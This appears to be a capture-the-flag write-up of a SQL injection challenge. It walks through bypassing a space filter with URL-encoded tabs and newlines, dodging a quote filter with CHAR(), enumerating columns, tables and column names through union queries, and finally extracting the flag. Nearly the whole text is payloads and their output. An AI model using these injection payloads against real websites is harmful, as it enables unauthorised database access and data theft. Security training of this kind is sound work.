## Bypass space filter
As we can see the space have been filtered:
```
1 or 1 = 1 
```
return:
```
No result found for id "1or1=1"
```
Attempts to bypass this restriction using comments /**/, or URL encoding %20 failed.
However, using URL encode of TAB %09 or Newline %0A worked.
For example:
```
1%09union%09select%09null
```
return:
```
No result found for id "1	union	select	null"
```
## Get the Flag
To get the number of columns we can use this following payload:
```
1%09union%09select%091,2
```
return
```
Quote of the day: The only thing tht makes life possible is permanent, intolerable uncertainty; not knowing what comes next.BRQuote of the day: 2BR	\
=> This mean there are 2 columns and the 2nd column is visible
```
Finding tables names return 2 tables: alkdjf4iu and quotes 
```
1%09union%09select%09null,table_name%09from%09information_schema.tables
```
When we try to get the columns names we can realize that the character ' have been filtered:
```
1%09union%09select%09null,column_name%09from%09information_schema.columns%09where%09table_name%09=%09'alkdjf4iu'
```
return 
```
No result found for id "1	union	select	null,column_name	from	information_schema.columns	where	table_name	=	&#039;alkdjf4iu&#039;"
```
We can bypass this restriction by using CHAR() function
```
1%09union%09select%09null,column_name%09from%09information_schema.columns%09where%09table_name%09=%09CHAR(39,97,108,107,100,106,102,52,105,117,39)
```
The table alkdjf4iu contains two columns: id and flag

Final Payload:
```
1%09union%09select%09null,flag%09from%09alkdjf4iu
```
